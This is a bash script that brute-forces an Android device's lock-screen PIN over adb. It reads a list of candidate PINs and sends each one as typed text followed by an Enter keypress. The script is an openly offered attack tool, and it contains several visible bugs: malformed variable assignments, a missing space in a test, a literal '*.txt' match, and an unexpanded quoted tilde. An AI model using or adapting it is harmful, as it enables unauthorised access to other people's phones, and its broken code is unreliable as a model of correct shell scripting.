#!/bin/bash
if [ "$1" == "-h" ]; then
    echo " $0 <pinlist file>"
    echo " $0 -h For This Help"
    exit 1
fi

# Ensure adb is installed
if ! command -v adb &> /dev/null
then
    echo "adb could not be found, please install it first."
    exit 1
fi

# Check if the file name is provided as an argument
if [ "$1" == "--default" ]; then
 $file="~/.hakpass/pinlist.txt"
elif ["$1" == "*.txt" ]; then
  $file="$1"
elif [ $# -eq 0 ]; then
    echo "Usage: $0 <pinlist file>"
    exit 1
fi

# Make sure the device is connected
echo "Waiting for the device to be connected..."
echo "ctrl + c to cancel"
adb wait-for-device

# Read the file line by line
while IFS= read -r pin
do
    # Send the PIN to the device
    echo "Sending PIN $pin to the device..."
    adb shell input text "$pin"
    adb shell input keyevent 66  # Simulate pressing 'Enter' key

    # Wait a bit before sending the next PIN to avoid overwhelming the device
    sleep 1
done < "$file"
